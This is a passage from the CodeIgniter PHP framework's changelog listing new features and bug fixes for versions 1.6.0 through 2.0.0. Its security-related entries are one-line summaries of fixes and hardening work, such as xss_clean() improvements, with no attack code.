    + Moved \_remove\_invisible\_characters() function from the [Security Library](libraries/security.html) to [common functions.](general/common_functions.html)
    + Added audio/mpeg3 as a valid mime type for MP3.

### Bug fixes for 2.0.0

* Fixed a bug where you could not change the User-Agent when sending email.
* Fixed a bug where the Output class would send incorrect cached output for controllers implementing their own \_output() method.
* Fixed a bug where a failed query would not have a saved query execution time causing errors in the Profiler
* Fixed a bug that was writing log entries when multiple identical helpers and plugins were loaded.
* Fixed assorted user guide typos or examples (#10693, #8951, #7825, #8660, #7883, #6771, #10656).
* Fixed a language key in the profiler: "profiler\_no\_memory\_usage" to "profiler\_no\_memory".
* Fixed an error in the Zip library that didn't allow downloading on PHP 4 servers.
* Fixed a bug in the Form Validation library where fields passed as rule parameters were not being translated (#9132)
* Modified inflector helper to properly pluralize words that end in 'ch' or 'sh'
* Fixed a bug in xss\_clean() that was not allowing hyphens in query strings of submitted URLs.
* Fixed bugs in get\_dir\_file\_info() and get\_file\_info() in the File Helper with recursion, and file paths on Windows.
* Fixed a bug where Active Record override parameter would not let you disable Active Record if it was enabled in your database config file.
* Fixed a bug in reduce\_double\_slashes() in the String Helper to properly remove duplicate leading slashes (#7585)
* Fixed a bug in values\_parsing() of the XML-RPC library which prevented NULL variables typed as 'string' from being handled properly.
* Fixed a bug were form\_open\_multipart() didn't accept string attribute arguments (#10930).
* Fixed a bug (#10470) where get\_mime\_by\_extension() was case sensitive.
* Fixed a bug where some error messages for the SQLite and Oracle drivers would not display.
* Fixed a bug where files created with the Zip Library would result in file creation dates of 1980.
* Fixed a bug in the Session library that would result in PHP error when attempting to store values with objects.
* Fixed a bug where extending the Controller class would result in a fatal PHP error.
* Fixed a PHP Strict Standards Error in the index.php file.
* Fixed a bug where getimagesize() was being needlessly checked on non-image files in is\_allowed\_type().
* Fixed a bug in the Encryption library where an empty key was not triggering an error.
* Fixed a bug in the Email library where CC and BCC recipients were not reset when using the clear() method (#109).
* Fixed a bug in the URL Helper where prep\_url() could cause a PHP error on PHP versions < 5.1.2.
* Added a log message in core/output if the cache directory config value was not found.
* Fixed a bug where multiple libraries could not be loaded by passing an array to load->library()
* Fixed a bug in the html helper where too much white space was rendered between the src and alt tags in the img() function.
* Fixed a bug in the profilers \_compile\_queries() function.
* Fixed a bug in the date helper where the DATE\_ISO8601 variable was returning an incorrectly formatted date string.

## Version 1.7.2

Release Date: September 11, 2009

Hg Tag: v1.7.2

* Libraries
  + Added a new [Cart Class](libraries/cart.html).
  + Added the ability to pass $config['file\_name'] for the [File Uploading Class](libraries/file_uploading.html) and rename the uploaded file.
  + Changed order of listed user-agents so Safari would more accurately report itself. (#6844)
* Database
  + Switched from using gettype() in escape() to is\_\* methods, since future PHP versions might change its output.
  + Updated all database drivers to handle arrays in escape\_str()
  + Added escape\_like\_str() method for escaping strings to be used in LIKE conditions
  + Updated Active Record to utilize the new LIKE escaping mechanism.
  + Added reconnect() method to DB drivers to try to keep alive / reestablish a connection after a long idle.
  + Modified MSSQL driver to use mssql\_get\_last\_message() for error messages.
* Helpers
  + Added `form_multiselect()` to the [Form helper](helpers/form_helper.html).
  + Modified `form_hidden()` in the [Form helper](helpers/form_helper.html) to accept multi-dimensional arrays.
  + Modified `form_prep()` in the [Form helper](helpers/form_helper.html) to keep track of prepped fields to avoid multiple prep/mutation from subsequent calls which can occur when using Form Validation
    and form helper functions to output form fields.
  + Modified `directory_map()` in the [Directory helper](helpers/directory_helper.html) to allow the inclusion of hidden files, and to return FALSE on failure to read directory.
  + Modified the [Smiley helper](helpers/smiley_helper.html) to work with multiple fields and insert the smiley at the last known cursor position.
* General
  + Compatible with PHP 5.3.0
  + Modified [show\_error()](general/errors.html) to allow sending of HTTP server response codes.
  + Modified [show\_404()](general/errors.html) to send 404 status code, removing non-CGI compatible header() statement from error\_404.php template.
  + Added set\_status\_header() to the [Common functionsto allow use when the Output class is unavailable.](general/common_functions.html)
  + Added is\_php() to [Common functions](general/common_functions.html) to facilitate PHP version comparisons.+ Added 2 CodeIgniter "cheatsheets" (thanks to DesignFellow.com for this contribution).

### Bug fixes for 1.7.2

* Fixed assorted user guide typos or examples (#6743, #7214, #7516, #7287, #7852, #8224, #8324, #8349).
* Fixed a bug in the Form Validation library where multiple callbacks weren't working (#6110)
* doctype helper default value was missing a "1".
* Fixed a bug in the language class when outputting an error for an unfound file.
* Fixed a bug in the Calendar library where the shortname was output for "May".
* Fixed a bug with ORIG\_PATH\_INFO that was allowing URIs of just a slash through.
* Fixed a fatal error in the Oracle and ODBC drivers (#6752)
* Fixed a bug where xml\_from\_result() was checking for a nonexistent method.
* Fixed a bug where Database Forge's add\_column and modify\_column were not looping through when sent multiple fields.
* Fixed a bug where the File Helper was using '/' instead of the DIRECTORY\_SEPARATOR constant.
* Fixed a bug to prevent PHP errors when attempting to use sendmail on servers that have manually disabled the PHP popen() function.
* Fixed a bug that would cause PHP errors in XML-RPC data if the PHP data type did not match the specified XML-RPC type.
* Fixed a bug in the XML-RPC class with parsing dateTime.iso8601 data types.
* Fixed a case sensitive string replacement in xss\_clean()
* Fixed a bug in form\_textarea() where form data was not prepped correctly.
* Fixed a bug in form\_prep() causing it to not preserve entities in the user's original input when called back into a form element
* Fixed a bug in \_protect\_identifiers() where the swap prefix ($swap\_pre) was not being observed.
* Fixed a bug where the 400 status header sent with the 'disallowed URI characters' was not compatible with CGI environments.
* Fixed a bug in the typography class where heading tags could have paragraph tags inserted when using auto\_typography().

## Version 1.7.1

Release Date: February 10, 2009

Hg Tag: 1.7.1

* Libraries
  + Fixed an arbitrary script execution security flaw (#6068) in the Form Validation library (thanks to hkk)
  + Changed default current page indicator in the Pagination library to use <strong> instead of <b>
  + A "HTTP/1.1 400 Bad Request" header is now sent when disallowed characters are encountered.
  + Added <big>, <small>, <q>, and <tt> to the Typography parser's inline elements.
  + Added more accurate error reporting for the Email library when using sendmail.
  + Removed a strict type check from the `rotate()` function of the [Image Manipulation Class](libraries/image_lib.html).
  + Added enhanced error checking in file saving in the Image library when using the GD lib.
  + Added an additional newline between multipart email headers and the MIME message text for better compatibility with a variety of MUAs.
  + Made modest improvements to efficiency and accuracy of explode\_name() in the Image lib.
* Database
  + Added where\_in to the list of expected arguments received by `delete()`.
* Helpers
  + Added the ability to have optgroups in `form_dropdown()` within the [form helper](helpers/form_helper.html).
  + Added a doctype() function to the [HTML helper](helpers/html_helper.html).
  + Added ability to force lowercase for `url_title()` in the [URL helper](helpers/url_helper.html).
  + Changed the default "type" of `form_button()` to "button" from "submit" in the [form helper](helpers/form_helper.html).
  + Changed redirect() in the URL helper to allow redirections to URLs outside of the CI site.
  + Updated get\_cookie() to try to fetch the cookie using the global cookie prefix if the requested cookie name doesn't exist.
* Other Changes
  + Improved security in `xss_clean()` to help prevent attacks targeting Internet Explorer.
  + Added 'application/msexcel' to config/mimes.php for .xls files.
  + Added 'proxy\_ips' config item to whitelist reverse proxy servers from which to trust the HTTP\_X\_FORWARDED\_FOR header to
    to determine the visitor's IP address.
  + Improved accuracy of Upload::is\_allowed\_filetype() for images (#6715)

### Bug fixes for 1.7.1

* Database
  + Fixed a bug when doing 'random' on order\_by() (#5706).
  + Fixed a bug where adding a primary key through Forge could fail (#5731).
  + Fixed a bug when using DB cache on multiple databases (#5737).
  + Fixed a bug where TRUNCATE was not considered a "write" query (#6619).
  + Fixed a bug where csv\_from\_result() was checking for a nonexistent method.
  + Fixed a bug \_protect\_identifiers() where it was improperly removing all pipe symbols from items
* Fixed assorted user guide typos or examples (#5998, #6093, #6259, #6339, #6432, #6521).
* Fixed a bug in the MySQLi driver when no port is specified
* Fixed a bug (#5702), in which the field label was not being fetched properly, when "matching" one field to another.
* Fixed a bug in which identifers were not being escaped properly when reserved characters were used.
* Fixed a bug with the regular expression used to protect submitted paragraph tags in auto typography.
* Fixed a bug where double dashes within tag attributes were being converted to em dash entities.
* Fixed a bug where double spaces within tag attributes were being converted to non-breaking space entities.
* Fixed some accuracy issues with curly quotes in Typography::format\_characters()
* Changed a few docblock comments to reflect actual return values.
* Fixed a bug with high ascii characters in subject and from email headers.
* Fixed a bug in xss\_clean() where whitespace following a validated character entity would not be preserved.
* Fixed a bug where HTML comments and <pre> tags were being parsed in Typography::auto\_typography().
* Fixed a bug with non-breaking space cleanup in Typography::auto\_typography().
* Fixed a bug in database escaping where a compound statement (ie: SUM()) wasn't handled correctly with database prefixes.
* Fixed a bug when an opening quote is preceded by a paragraph tag and immediately followed by another tag.
* Fixed a bug in the Text Helper affecting some locales where word\_censor() would not work on words beginning or ending with an accented character.
* Fixed a bug in the Text Helper character limiter where the provided limit intersects the last word of the string.
* Fixed a bug (#6342) with plural() in the Inflection helper with words ending in "y".
* Fixed bug (#6517) where Routed URI segments returned by URI::rsegment() method were incorrect for the default controller.
* Fixed a bug (#6706) in the Security Helper where xss\_clean() was using a deprecated second argument.
* Fixed a bug in the URL helper url\_title() function where trailing periods were allowed at the end of a URL.
* Fixed a bug (#6669) in the Email class when CRLF's are used for the newline character with headers when used with the "mail" protocol.
* Fixed a bug (#6500) where URI::A\_filter\_uri() was exit()ing an error instead of using show\_error().
* Fixed a bug (#6592) in the File Helper where get\_dir\_file\_info() where recursion was not occurring properly.
* Tweaked Typography::auto\_typography() for some edge-cases.

## Version 1.7

Release Date: October 23, 2008

Hg Tag: 1.7.0

* Libraries
  + Added a new [Form Validation Class](libraries/form_validation.html). It simplifies setting rules and field names, supports arrays as field names, allows groups of validation rules to be saved in a config file, and adds some helper functions for use in view files. **Please note that the old Validation class is now deprecated**. We will leave it in the library folder for some time so that existing applications that use it will not break, but you are encouraged to migrate to the new version.
  + Updated the [Sessions class](libraries/sessions.html) so that any custom data being saved gets stored to a database rather than the session cookie (assuming you are using a database to store session data), permitting much more data to be saved.
  + Added the ability to store libraries in subdirectories within either the main "libraries" or the local application "libraries" folder. Please see the [Loader class](libraries/loader.html) for more info.
  + Added the ability to assign library objects to your own variable names when you use `$this->load->library()`. Please see the [Loader class](libraries/loader.html) for more info.
  + Added controller class/method info to [Profiler class](general/profiling.html) and support for multiple database connections.
  + Improved the "auto typography" feature and moved it out of the helper into its own [Typography Class](libraries/typography.html).
  + Improved performance and accuracy of `xss_clean()`, including reduction of false positives on image/file tests.
  + Improved [Parser class](./libraries/parser.html) to allow multiple calls to the parse() function. The output of each is appended in the output.
  + Added max\_filename option to set a file name length limit in the [File Upload Class](libraries/file_uploading.html).
  + Added set\_status\_header() function to [Output class](libraries/output.html).
  + Modified [Pagination](libraries/pagination.html) class to only output the "First" link when the link for page one would not be shown.
  + Added support for mb\_strlen in the [Form Validation](libraries/form_validation.html) class so that multi-byte languages will calculate string lengths properly.
* Database
  + Improved Active Record class to allow full path column and table names: hostname.database.table.column. Also improved the alias handling.
  + Improved how table and column names are escaped and prefixed. It now honors full path names when adding prefixes and escaping.
  + Added Active Record caching feature to "update" and "delete" functions.
  + Added removal of non-printing control characters in `escape_str()` of DB drivers that do not have native PHP escaping mechanisms (mssql, oci8, odbc), to avoid potential SQL errors, and possible sources of SQL injection.
  + Added port support to MySQL, MySQLi, and MS SQL database drivers.
  + Added driver name variable in each DB driver, based on bug report #4436.
* Helpers
  + Added several new "setting" functions to the [Form helper](helpers/form_helper.html) that allow POST data to be retrieved and set into forms. These are intended to be used on their own, or with the new [Form Validation Class](libraries/form_validation.html).
  + Added `current_url()` and uri\_segments() to [URL helper](helpers/url_helper.html).
  + Altered `auto_link()` in the [URL helper](helpers/url_helper.html) so that email addresses with "+" included will be linked.
  + Added `meta()` function to [HTML helper](helpers/html_helper.html).
  + Improved accuracy of calculations in [Number helper](helpers/number_helper.html).
  + Removed added newlines ("\n") from most form and html helper functions.
  + Tightened up validation in the [Date helper](helpers/date_helper.html) function `human_to_unix()`, and eliminated the POSIX regex.
  + Updated [Date helper](helpers/date_helper.html) to match the world's current time zones and offsets.
  + Modified url\_title() in the [URL helper](helpers/url_helper.html) to remove characters and digits that are part of
    character entities, to allow dashes, underscores, and periods regardless of the $separator, and to allow uppercase characters.
  + Added support for arbitrary attributes in anchor\_popup() of the [URL helper](helpers/url_helper.html).
* Other Changes
  + Added [PHP Style Guide](./general/styleguide.html) to docs.
  + Added sanitization in `xss_clean()` for a deprecated HTML tag that could be abused in user input in Internet Explorer.
  + Added a few openxml document mime types, and an additional mobile agent to mimes.php and user\_agents.php respectively.
  + Added a file lock check during caching, before trying to write to the file.
  + Modified Cookie key cleaning to unset a few troublesome key names that can be present in certain environments, preventing CI from halting execution.
  + Changed the output of the profiler to use style attribute rather than clear, and added the id "codeigniter\_profiler" to the container div.

### Bug fixes for 1.7.0

* Fixed bug in `xss_clean()` that could remove some desirable tag attributes.
* Fixed assorted user guide typos or examples (#4807, #4812, #4840, #4862, #4864, #4899, #4930, #5006, #5071, #5158, #5229, #5254, #5351).
* Fixed an edit from 1.6.3 that made the $robots array in user\_agents.php go poof.
* Fixed a bug in the [Email library](libraries/email.html) with quoted-printable encoding improperly encoding space and tab characters.
* Modified XSS sanitization to no longer add semicolons after &[single letter], such as in M&M's, B&B, etc.
* Modified XSS sanitization to no longer strip XHTML image tags of closing slashes.
* Fixed a bug in the Session class when database sessions are used where upon session update all userdata would be errantly written to the session cookie.
* Fixed a bug (#4536) in backups with the MySQL driver where some legacy code was causing certain characters to be double escaped.
* Fixed a routing bug (#4661) that occurred when the default route pointed to a subfolder.
* Fixed the spelling of "Dhaka" in the `timezone_menu()` function of the [Date helper.](helpers/date_helper.html)
* Fixed the spelling of "raspberry" in config/smileys.php.
* Fixed incorrect parenthesis in `form_open()` function (#5135).
* Fixed a bug that was ignoring case when comparing controller methods (#4560).
* Fixed a bug (#4615) that was not setting SMTP authorization settings when using the initialize function.
* Fixed a bug in `highlight_code()` in the [Text helper](helpers/text_helper.html) that would leave a stray </span> in certain cases.
* Fixed Oracle bug (#3306) that was preventing multiple queries in one action.
* Fixed ODBC bug that was ignoring connection params due to its use of a constructor.
* Fixed a DB driver bug with num\_rows() that would cause an error with the Oracle driver.
* Fixed MS SQL bug (#4915). Added brackets around database name in MS SQL driver when selecting the database, in the event that reserved characters are used in the name.
* Fixed a DB caching bug (4718) in which the path was incorrect when no URI segments were present.
* Fixed Image\_lib class bug #4562. A path was not defined for NetPBM.
* Fixed Image\_lib class bug #4532. When cropping an image with identical height/width settings on output, a copy is made.
* Fixed DB\_driver bug (4900), in which a database error was not being logged correctly.
* Fixed DB backup bug in which field names were not being escaped.
* Fixed a DB Active Record caching bug in which multiple calls to cached data were not being honored.
* Fixed a bug in the Session class that was disallowing slashes in the serialized array.
* Fixed a Form Validation bug in which the "isset" error message was being trigged by the "required" rule.
* Fixed a spelling error in a Loader error message.
* Fixed a bug (5050) with IP validation with empty segments.
* Fixed a bug in which the parser was being greedy if multiple identical sets of tags were encountered.

## Version 1.6.3

Release Date: June 26, 2008

Hg Tag: v1.6.3

Version 1.6.3 is a security and maintenance release and is recommended for all users.

* Database
  + Modified MySQL/MySQLi Forge class to give explicit names to keys
  + Added ability to set multiple column non-primary keys to the [Forge class](database/forge.html)
  + Added ability to set additional database config values in [DSN connections](database/connecting.html) via the query string.
* Libraries
  + Set the mime type check in the [Upload class](libraries/file_uploading.html) to reference the global mimes variable.
  + Added support for query strings to the [Pagination class](libraries/pagination.html), automatically detected or explicitly declared.
  + Added `get_post()` to the [Input class](libraries/input.html).
  + Documented `get()` in the [Input class](libraries/input.html).
  + Added the ability to automatically output language items as form labels in the [Language class](libraries/language.html).
* Helpers
  + Added a [Language helper](helpers/language_helper.html).
  + Added a [Number helper](helpers/number_helper.html).
  + [Form helper](helpers/form_helper.html) refactored to allow `form_open()` and `form_fieldset()` to accept arrays or strings as arguments.
* Other changes
  + Improved security in `xss_clean()`.
  + Removed an unused Router reference in `_display_cache()`.
  + Added ability to [use xss\_clean() to test images](libraries/input.html) for XSS, useful for upload security.
  + Considerably expanded list of mobile user-agents in config/user\_agents.php.
  + Charset information in the userguide has been moved above title for internationalization purposes (#4614).
  + Added "Using Associative Arrays In a Request Parameter" example to the [XMLRPC userguide page](libraries/xmlrpc.html).
  + Removed maxlength and size as automatically added attributes of form\_input() in the [form helper](helpers/form_helper.html).
  + Documented the language file use of `byte_format()` in the [number helper](helpers/number_helper.html).

### Bug fixes for 1.6.3

* Added a language key for valid\_emails in validation\_lang.php.
* Amended fixes for bug (#3419) with parsing DSN database connections.
* Moved the `_has_operators()` function (#4535) into DB\_driver from DB\_active\_rec.
* Fixed a syntax error in upload\_lang.php.
* Fixed a bug (#4542) with a regular expression in the Image library.
* Fixed a bug (#4561) where `orhaving()` wasn't properly passing values.
* Removed some unused variables from the code (#4563).
* Fixed a bug where `having()` was not adding an = into the statement (#4568).
* Fixed assorted user guide typos or examples (#4574, #4706).
* Added quoted-printable headers to Email class when the multi-part override is used.
* Fixed a double opening <p> tag in the index pages of each system directory.

## Version 1.6.2

Release Date: May 13, 2008

Hg Tag: 1.6.2

* Active Record
  + Added the ability to prevent escaping in `having()` clauses.
  + Added `rename_table()` into [DBForge](./database/forge.html).
  + Fixed a bug that wasn't allowing escaping to be turned off if the value of a query was NULL.
  + DB Forge is now assigned to any models that exist after loading (#3457).
* Database
  + Added [Strict Mode](./database/transactions.html) to database transactions.
  + Escape behaviour in where() clauses has changed; values in those with the "FALSE" argument are no longer escaped (ie: quoted).
* Config
  + Added 'application/vnd.ms-powerpoint' to list of mime types.
  + Added 'audio/mpg' to list of mime types.
  + Added new user-modifiable file constants.php containing file mode and fopen constants.
  + Added the ability to set CRLF settings via config in the [Email](libraries/email.html) class.
* Libraries
  + Added increased security for filename handling in the Upload library.
  + Added increased security for sessions for client-side data tampering.
  + The MySQLi forge class is now in sync with MySQL forge.
  + Added the ability to set CRLF settings via config in the [Email](libraries/email.html) class.
  + [Unit Testing](libraries/unit_testing.html) results are now colour coded, and a change was made to the default template of results.
  + Added a valid\_emails rule to the Validation class.
  + The [Zip class](libraries/zip.html) now exits within `download()`.
  + The [Zip class](libraries/zip.html) has undergone a substantial re-write for speed and clarity (thanks stanleyxu for the hard work and code contribution in bug report #3425!)
* Helpers
  + Added a [Compatibility Helper](helpers/compatibility_helper.html) for using some common PHP 5 functions safely in applications that might run on PHP 4 servers (thanks Seppo for the hard work and code contribution!)
  + Added `form_button()` in the [Form helper](helpers/form_helper.html).
  + Changed the `radio()` and `checkbox()` functions to default to not checked by default.
  + Added the ability to include an optional HTTP Response Code in the `redirect()` function of the [URL Helper](helpers/url_helper.html).
  + Modified `img()` in the [HTML Helper](helpers/html_helper.html) to remove an unneeded space (#4208).
  + Modified `anchor()` in the [URL helper](helpers/url_helper.html) to no longer add a default title= attribute (#4209).
  + The [Download helper](helpers/download_helper.html) now exits within `force_download()`.
  + Added `get_dir_file_info()`, `get_file_info()`, and `get_mime_by_extension()` to the [File Helper](helpers/file_helper.html).
  + Added `symbolic_permissions()` and `octal_permissions()` to the [File helper](helpers/file_helper.html).
* Plugins
  + Modified captcha generation to first look for the function imagecreatetruecolor, and fallback to imagecreate if it isn't available (#4226).
* Other
  Changes
  + Added ability for [xss\_clean()](libraries/input.html) to accept arrays.
  + Removed closing PHP tags from all PHP files to avoid accidental output and potential 'cannot modify headers' errors.
  + Removed "scripts" from the auto-load search path. Scripts were deprecated
    in Version 1.4.1 (September 21, 2006). If you still need to use them for legacy reasons, they must now be manually loaded in each Controller.
  + Added a [Reserved Names](general/reserved_names.html) page to the userguide, and migrated reserved controller names into it.
  + Added a [Common Functions](general/common_functions.html) page to the userguide for globally available functions.
  + Improved security and performance of xss\_clean().

### Bugfixes for 1.6.2

* Fixed a bug where SET queries were not being handled as "write" queries.
* Fixed a bug (#3191) with ORIG\_PATH\_INFO URI parsing.
* Fixed a bug in DB Forge, when inserting an id field (#3456).
* Fixed a bug in the table library that could cause identically constructed rows to be dropped (#3459).
* Fixed DB Driver and MySQLi result driver checking for resources instead of objects (#3461).
* Fixed an AR\_caching error where it wasn't tracking table aliases (#3463).
* Fixed a bug in AR compiling, where select statements with arguments got incorrectly escaped (#3478).
* Fixed an incorrect documentation of $this->load->language (#3520).
* Fixed bugs (#3523, #4350) in get\_filenames() with recursion and problems with Windows when $include\_path is used.
* Fixed a bug (#4153) in the XML-RPC class preventing dateTime.iso8601 from being used.
* Fixed an AR bug with or\_where\_not\_in() (#4171).
* Fixed a bug with [xss\_clean()](libraries/input.html) that would add semicolons to GET URI variable strings.
* Fixed a bug (#4206) in the Directory Helper where the directory resource was not being closed, and minor improvements.
* Fixed a bug in the FTP library where delete\_dir() was not working recursively (#4215).
* Fixed a Validation bug when set\_rules() is used with a non-array field name and rule (#4220).
* Fixed a bug (#4223) where DB caching would not work for returned DB objects or multiple DB connections.
* Fixed a bug in the Upload library that might output the same error twice (#4390).
* Fixed an AR bug when joining with a table alias and table prefix (#4400).
* Fixed a bug in the DB class testing the $params argument.
* Fixed a bug in the Table library where the integer 0 in cell data would be displayed as a blank cell.
* Fixed a bug in `link_tag()` of the [URL helper](helpers/url_helper.html) where a key was passed instead of a value.
* Fixed a bug in DB\_result::row() that prevented it from returning individual fields with MySQL NULL values.
* Fixed a bug where SMTP emails were not having dot transformation performed on lines that begin with a dot.
* Fixed a bug in display\_error() in the DB driver that was instantiating new Language and Exception objects, and not using the error heading.
* Fixed a bug (#4413) where a URI containing slashes only e.g. 'http://example.com/index.php?//' would result in PHP errors
* Fixed an array to string conversion error in the Validation library (#4425)
* Fixed bug (#4451, #4299, #4339) where failed transactions will not rollback when debug mode is enabled.
* Fixed a bug (#4506) with overlay\_watermark() in the Image library preventing support for PNG-24s with alpha transparency
* Fixed assorted user guide typos (#3453, #4364, #4379, #4399, #4408, #4412, #4448, #4488).

## Version 1.6.1

Release Date: February 12, 2008

Hg Tag: 1.6.1

* Active Record
  + Added [Active Record Caching](./database/active_record.html#caching).
  + Made Active Record fully database-prefix aware.
* Database drivers
  + Added support for setting client character set and collation for MySQLi.
* Core Changes
  + Modified `xss_clean()` to be more intelligent with its handling of URL encoded strings.
  + Added $\_SERVER, $\_FILES, $\_ENV, and $\_SESSION to sanitization of globals.
  + Added a [Path Helper](./helpers/path_helper.html).
  + Simplified `_reindex_segments()` in the URI class.
  + Escaped the '-' in the default 'permitted\_uri\_chars' config item, to prevent errors if developers just try to add additional characters to the end of the default expression.
  + Modified method calling to controllers to show a 404 when a private or protected method is accessed via a URL.
  + Modified framework initiated 404s to log the controller and method for invalid requests.
* Helpers
  + Modified `get_filenames()` in the File Helper to return FALSE if the $source\_dir is not readable.

### Bugfixes for 1.6.1

* Deprecated is\_numeric as a validation rule. Use of numeric and integer are preferred.
* Fixed bug (#3379) in DBForge with SQLite for table creation.
* Made Active Record fully database prefix aware (#3384).
* Fixed a bug where DBForge was outputting invalid SQL in Postgres by adding brackets around the tables in FROM.
* Changed the behaviour of Active Record's update() to make the WHERE clause optional (#3395).
* Fixed a bug (#3396) where certain POST variables would cause a PHP warning.
* Fixed a bug in query binding (#3402).
* Changed order of SQL keywords in the Profiler $highlight array so OR would not be highlighted before ORDER BY.
* Fixed a bug (#3404) where the MySQLi driver was testing if $this->conn\_id was a resource instead of an object.
* Fixed a bug (#3419) connecting to a database via a DSN string.
* Fixed a bug (#3445) where the routed segment array was not re-indexed to begin with 1 when the default controller is used.
* Fixed assorted user guide typos.

## Version 1.6.0

Release Date: January 30, 2008

* DBForge
  + Added [DBForge](./database/forge.html) to the database tools.
  + Moved `create_database()` and `drop_database()` into [DBForge](./database/forge.html).
  + Added `add_field()`, `add_key()`, `create_table()`, `drop_table()`, `add_column()`, `drop_column()`, `modify_column()` into [DBForge](./database/forge.html).
* Active Record
  + Added `protect_identifiers()` in [Active Record](./database/active_record.html).
  + All AR queries are backticked if appropriate to the database.
  + Added `where_in()`, `or_where_in()`, `where_not_in()`, `or_where_not_in()`, `not_like()` and `or_not_like()` to [Active Record](./database/active_record.html).
  + Added support for `limit()` into `update()` and `delete()` statements in [Active Record](./database/active_record.html).
  + Added `empty_table()` and `truncate_table()` to [Active Record](./database/active_record.html).
  + Added the ability to pass an array of tables to the `delete()` statement in [Active Record](./database/active_record.html).
  + Added `count_all_results()` function to [Active Record](./database/active_record.html).
  + Added `select_max()`, `select_min()`, `select_avg()` and `select_sum()` to [Active Record](./database/active_record.html).
  + Added the ability to use aliases with joins in [Active Record](./database/active_record.html).
  + Added a third parameter to Active Record's `like()` clause to control where the wildcard goes.
  + Added a third parameter to `set()` in [Active Record](./database/active_record.html) that withholds escaping data.
  + Changed the behaviour of variables submitted to the where() clause with no values to auto set "IS NULL"
* Other Database Related
  + MySQL driver now requires MySQL 4.1+
  + Added $this->DB->save\_queries variable to DB driver, enabling queries to get saved or not. Previously they were always saved.
  + Added $this->db->dbprefix() to manually add database prefixes.
  + Added 'random' as an `order_by()` option , and removed "rand()" as a listed option as it was MySQL only.
  + Added a check for NULL fields in the MySQL database backup utility.
  + Added "constrain\_by\_prefix" parameter to db->list\_table() function. If set to TRUE it will limit the result to only table names with the current prefix.
  + Deprecated from Active Record; `getwhere()` for `get_where()`; `groupby()` for `group_by()`; `havingor()` for `having_or()`; `orderby()` for `order_by`; `orwhere()` for `or_where()`; and `orlike()` for `or_like()`.
  + Modified `csv_from_result()` to output CSV data more in the spirit of basic rules of RFC 4180.
  + Added 'char\_set' and 'dbcollat' database configuration settings, to explicitly set the client communication properly.
  + Removed 'active\_r' configuration setting and replaced with a global $active\_record setting, which is more
    in harmony with the global nature of the behavior (#1834).
* Core changes
  + Added ability to load multiple views, whose content will be appended to the output in the order loaded.
  + Added the ability to [auto-load](./general/autoloader.html) [Models](./general/models.html).
  + Reorganized the URI and Routes classes for better clarity.
  + Added Compat.php to allow function overrides for older versions of PHP or PHP environments missing certain extensions / libraries
  + Added memory usage, GET, URI string data, and individual query execution time to Profiler output.
  + Deprecated Scaffolding.
  + Added is\_really\_writable() to Common.php to provide a cross-platform reliable method of testing file/folder writability.
* Libraries
  + Changed the load protocol of Models to allow for extension.
  + Strengthened the Encryption library to help protect against man in the middle attacks when MCRYPT\_MODE\_CBC mode is used.
  + Added Flashdata variables, session\_id regeneration and configurable session update times to the [Session class.](./libraries/sessions.html)
  + Removed 'last\_visit' from the Session class.
  + Added a language entry for valid\_ip validation error.
  + Modified prep\_for\_form() in the Validation class to accept arrays, adding support for POST array validation (via callbacks only)
  + Added an "integer" rule into the Validation library.
  + Added valid\_base64() to the Validation library.
  + Documented clear() in the [Image Processing](../libraries/image_lib.html) library.
  + Changed the behaviour of custom callbacks so that they no longer trigger the "required" rule.
  + Modified Upload class $\_FILES error messages to be more precise.
  + Moved the safe mode and auth checks for the Email library into the constructor.
  + Modified variable names in \_ci\_load() method of Loader class to avoid conflicts with view variables.
  + Added a few additional mime type variations for CSV.
  + Enabled the 'system' methods for the XML-RPC Server library, except for 'system.multicall' which is still disabled.
* Helpers & Plugins
  + Added link\_tag() to the [HTML helper.](./helpers/html_helper.html)
  + Added img() to the [HTML helper.](./helpers/html_helper.html)
  + Added ability to ["extend" Helpers](./general/helpers.html).
  + Added an [email helper](./helpers/email_helper.html) into core helpers.
  + Added `strip_quotes()` function to [string helper](./helpers/string_helper.html).
  + Added `reduce_multiples()` function to [string helper](./helpers/string_helper.html).
  + Added `quotes_to_entities()` function to [string helper](./helpers/string_helper.html).
  + Added `form_fieldset()`, `form_fieldset_close()`, `form_label()`, and `form_reset()` function to [form helper](./helpers/form_helper.html).
  + Added support for external urls in `form_open()`.
  + Removed support for db\_backup in MySQLi due to incompatible functions.
  + Javascript Calendar plugin now uses the months and days from the calendar language file, instead of hard-coded values, internationalizing it.
* Documentation Changes
  + Added [Writing Documentation](./doc_style/index.html) section for the community to use in writing their own documentation.
  + Added titles to all user manual pages.
  + Added attributes into <html> of userguide for valid html.
  + Added [Zip Encoding Class](https://codeigniter.com/user_guide/libraries/zip.html) to the table of contents of the userguide.
  + Moved part of the userguide menu javascript to an external file.
  + Documented `distinct()` in [Active Record](./database/active_record.html).
  + Documented the `timezones()` function in the [Date Helper](./helpers/date_helper.html).
  + Documented unset\_userdata in the [Session class](./libraries/sessions.html).
  + Documented 2 config options to the [Database configuration](./database/configuration.html) page.

### Bug fixes for Version 1.6.0

* Fixed a bug (#1813) preventing using $CI->db in the same application with returned database objects.
* Fixed a bug (#1842) where the $this->uri->rsegments array would not include the 'index' method if routed to the controller without an implicit method.
* Fixed a bug (#1872) where word\_limiter() was not retaining whitespace.
* Fixed a bug (#1890) in csv\_from\_result() where content that included the delimiter would break the file.
* Fixed a bug (#2542)in the clean\_email() method of the Email class to allow for non-numeric / non-sequential array keys.
* Fixed a bug (#2545) in `_html_entity_decode_callback()` when 'global\_xss\_filtering' is enabled.
* Fixed a bug (#2668) in the [parser class](./libraries/parser.html) where numeric data was ignored.
* Fixed a bug (#2679) where the "previous" pagination link would get drawn on the first page.
* Fixed a bug (#2702) in \_object\_to\_array that broke some types of inserts and updates.
* Fixed a bug (#2732) in the SQLite driver for PHP 4.
* Fixed a bug (#2754) in Pagination to scan for non-positive num\_links.
* Fixed a bug (#2762) in the [Session library](./libraries/sessions.html) where user agent matching would fail on user agents ending with a space.
* Fixed a bug (#2784) $field\_names[] vs $Ffield\_names[] in postgres and sqlite drivers.
* Fixed a bug (#2810) in the typography helper causing extraneous paragraph tags when string contains tags.
* Fixed a bug (#2849) where arguments passed to a subfolder controller method would be incorrectly shifted, dropping the 3rd segment value.
* Fixed a bug (#2858) which referenced a wrong variable in the Image class.
* Fixed a bug (#2875)when loading plugin files as \_plugin. and not \_pi.
* Fixed a bug (#2912) in `get_filenames()` in the [File Helper](./helpers/file_helper.html) where the array wasn't cleared after each call.
* Fixed a bug (#2974) in `highlight_phrase()` that caused an error with slashes.
